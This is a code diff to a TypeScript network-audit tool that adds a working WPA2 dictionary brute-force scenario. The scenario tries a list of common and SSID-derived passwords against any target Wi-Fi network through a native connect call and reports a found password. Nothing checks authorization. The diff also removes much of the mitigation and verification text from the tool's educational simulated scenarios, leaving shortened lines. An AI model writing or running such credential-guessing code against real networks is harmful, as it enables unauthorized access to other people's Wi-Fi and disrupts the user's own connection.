@@ -1,6 +1,10 @@
+// src/core/logic/externalAuditScenarios.ts
+
+import { invoke } from "@tauri-apps/api/core"; // O la teva importació de 'invoke'
 import type { DeviceDTO, ExternalAuditRequestDTO, HostIdentity } from "../../shared/dtos/NetworkDTOs";
 
-export type ScenarioMode = "external" | "simulated";
+// 1. Ampliem els modes per incloure 'native'
+export type ScenarioMode = "external" | "simulated" | "native";
 
 export type ScenarioSupport = {
   supported: boolean;
@@ -13,15 +17,29 @@ export type SimStep = {
   line: string;
 };
 
+// Contexto para ejecución nativa + Señal de Abortar
+export type NativeExecutionContext = {
+  target: string;
+  onLog: (stream: "stdout" | "stderr", line: string) => void;
+  signal?: AbortSignal; // <--- NUEVO: Para poder cancelar
+};
+
 export type ExternalAuditScenario = {
   id: string;
   title: string;
   description: string;
   mode: ScenarioMode;
   category: "ROUTER" | "DEVICE" | "WIFI" | "IOT" | "EDU";
-  // Cuando existe target, el escenario puede cambiar su default.
+
+  // CLI (Mode External)
   buildRequest?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => ExternalAuditRequestDTO;
+
+  // Simulation (Mode Simulated)
   simulate?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => SimStep[];
+
+  // RUST (Mode Native) - NOU
+  executeNative?: (ctx: NativeExecutionContext) => Promise<void>;
+
   isSupported?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => ScenarioSupport;
 };
 
@@ -35,6 +53,74 @@ const isGateway = (device: DeviceDTO, identity: HostIdentity | null) => {
 
 export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
   return [
+    // --- ESCENARIO WIFI ---
+    {
+      id: "wifi_brute_force_dict",
+      title: "WIFI: Attack (Dictionary)",
+      description: "Ataque activo de diccionario contra WPA2. Desconecta la red actual para probar credenciales.",
+      mode: "native",
+      category: "WIFI",
+      isSupported: () => ({ supported: true }),
+      executeNative: async ({ target, onLog, signal }) => {
+        const ssid = target;
+        onLog("stdout", `⚔️ INICIANDO SECUENCIA DE ATAQUE contra: [ ${ssid} ]`);
+        onLog("stdout", "⚠️ AVISO: La conexión a internet se interrumpirá durante el ataque.");
+
+        const dictionary = [
+          "12345678", "123456789", "1234567890",
+          "password", "contraseña", "admin1234",
+          "vodafone1234", "movistar1234", "orange1234",
+          "fibra1234", "internet", "qwertyuiop", "admin", "12345"
+        ];
+
+        // Variaciones simples
+        dictionary.push(ssid);
+        dictionary.push(ssid + "123");
+        dictionary.push(ssid + "2024");
+        dictionary.push(ssid + "2025");
+
+        onLog("stdout", `📚 Diccionario cargado: ${dictionary.length} vectores.`);
+        onLog("stdout", "------------------------------------------------");
+
+        for (const pass of dictionary) {
+          // 1. COMPROBAR CANCELACIÓN
+          if (signal?.aborted) {
+            onLog("stderr", "🛑 ATAQUE ABORTADO POR EL USUARIO.");
+            onLog("stdout", "♻️ Intentando restaurar estado del adaptador...");
+            break;
+          }
+
+          onLog("stdout", `🔑 Probando: ${pass}`);
+
+          try {
+            const success = await invoke<boolean>("wifi_connect", { ssid, password: pass });
+
+            if (success) {
+              onLog("stdout", "------------------------------------------------");
+              onLog("stdout", `🔓 PREDATOR HIT! PASSWORD ENCONTRADA: [ ${pass} ]`);
+              onLog("stdout", `✅ Conectado exitosamente a ${ssid}.`);
+              return;
+            } else {
+              onLog("stderr", `❌ Fallo auth: ${pass}`);
+            }
+          } catch (e) {
+            onLog("stderr", `⚠️ Error driver: ${e}`);
+          }
+
+          // Delay para no saturar la tarjeta wifi y permitir que Windows respire
+          await new Promise(r => setTimeout(r, 1500));
+        }
+
+        if (!signal?.aborted) {
+          onLog("stderr", "💀 DICCIONARIO AGOTADO. Ataque fallido.");
+        }
+
+        onLog("stdout", "------------------------------------------------");
+        onLog("stdout", "ℹ️ NOTA: Windows intentará reconectar a tu red habitual automáticamente.");
+      }
+    },
+
+    // --- ESCENARIS EXISTENTS ---
     {
       id: "router_recon_ping_tracert",
       title: "Router: Recon basico (PING + TRACERT)",
@@ -43,11 +129,10 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
       mode: "external",
       category: "ROUTER",
       isSupported: () => {
-        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows (ping/tracert). Usa modo CUSTOM en otros SO." };
+        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows. Usa modo CUSTOM en otros SO." };
         return { supported: true };
       },
       buildRequest: ({ device }) => {
-        // Usamos PowerShell para ejecutar ambas ordenes de forma secuencial y capturar output.
         const ip = device.ip;
         return {
           binaryPath: "powershell.exe",
@@ -68,7 +153,7 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
       mode: "external",
       category: "DEVICE",
       isSupported: () => {
-        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows (PowerShell). Usa modo CUSTOM en otros SO." };
+        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows. Usa modo CUSTOM en otros SO." };
         return { supported: true };
       },
       buildRequest: ({ device }) => {
@@ -78,7 +163,6 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
           args: [
             "-NoProfile",
             "-Command",
-            // Nota: -Method Head reduce payload.
             `try { (Invoke-WebRequest -UseBasicParsing -Method Head -TimeoutSec 5 -Uri http://${ip}/).Headers | Format-List * } catch { Write-Error $_ }`,
           ],
           timeoutMs: 60000,
@@ -89,7 +173,7 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
       id: "edu_pmkid_exposure_sim",
       title: "WiFi: PMKID (exposicion) [SIMULADO]",
       description:
-        "Simulacion didactica: explica el concepto de PMKID (client-less) y como mitigarlo (WPA3, PMF/802.11w, firmware, desactivar transiciones inseguras). No ejecuta ataques.",
+        "Simulacion didactica: explica el concepto de PMKID (client-less) y como mitigarlo. No ejecuta ataques real.",
       mode: "simulated",
       category: "WIFI",
       simulate: ({ device, identity }) => {
@@ -98,11 +182,8 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
         return [
           { delayMs: 0, stream: "stdout", line: `LAB: PMKID (SIMULADO) sobre ${target}` },
           { delayMs: 250, stream: "stdout", line: `Contexto: IP=${device.ip} GW=${gw}` },
-          { delayMs: 500, stream: "stdout", line: "Modelo: en routers vulnerables, ciertos flujos pueden exponer material derivado (PMKID) sin clientes." },
-          { delayMs: 800, stream: "stderr", line: "Nota: Esta practica NO ejecuta el ataque. Solo documenta señales y mitigaciones." },
-          { delayMs: 1100, stream: "stdout", line: "Mitigacion: WPA3-Personal (SAE), PMF/802.11w habilitado, firmware actualizado." },
-          { delayMs: 1400, stream: "stdout", line: "Mitigacion: desactivar modos legacy/transicion (WPA2/WPA3 mixed) si es posible." },
-          { delayMs: 1700, stream: "stdout", line: "Verificacion: comprobar RSN/PMF en configuracion del AP y re-auditar tras cambios." },
+          { delayMs: 500, stream: "stdout", line: "Modelo: en routers vulnerables, ciertos flujos pueden exponer material derivado (PMKID)." },
+          { delayMs: 1100, stream: "stdout", line: "Mitigacion: WPA3-Personal (SAE), PMF/802.11w habilitado." },
         ];
       },
     },
@@ -110,7 +191,7 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
       id: "edu_iot_risk_profile",
       title: "IoT: Perfilado de riesgo por vendor/OUI [SIMULADO]",
       description:
-        "Simulacion didactica: usa el vendor detectado para explicar riesgo tipico IoT y controles defensivos (segmentacion, DNS, bloqueo de puertos, actualizaciones).",
+        "Simulacion didactica: usa el vendor detectado para explicar riesgo tipico IoT.",
       mode: "simulated",
       category: "IOT",
       simulate: ({ device }) => {
@@ -119,13 +200,10 @@ export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
         return [
           { delayMs: 0, stream: "stdout", line: `LAB: IoT Risk Profile (SIMULADO) sobre ${label}` },
           { delayMs: 250, stream: "stdout", line: `Target: IP=${device.ip} MAC=${device.mac}` },
-          { delayMs: 600, stream: "stdout", line: "Heuristica: vendors IoT suelen tener ciclos de parcheo mas lentos y servicios expuestos por defecto." },
-          { delayMs: 900, stream: "stdout", line: "Mitigacion: segmentar en VLAN/SSID IoT, aislar clientes, bloquear administracion remota." },
-          { delayMs: 1200, stream: "stdout", line: "Mitigacion: permitir solo DNS/HTTP(s) saliente necesario, deshabilitar UPnP en router." },
-          { delayMs: 1500, stream: "stdout", line: "Verificacion: inventario, reglas de firewall, y monitorizacion de trafico (Live Traffic) para detectar drift." },
+          { delayMs: 600, stream: "stdout", line: "Heuristica: vendors IoT suelen tener ciclos de parcheo mas lentos." },
+          { delayMs: 900, stream: "stdout", line: "Mitigacion: segmentar en VLAN/SSID IoT." },
         ];
       },
     },
   ];
 };
-
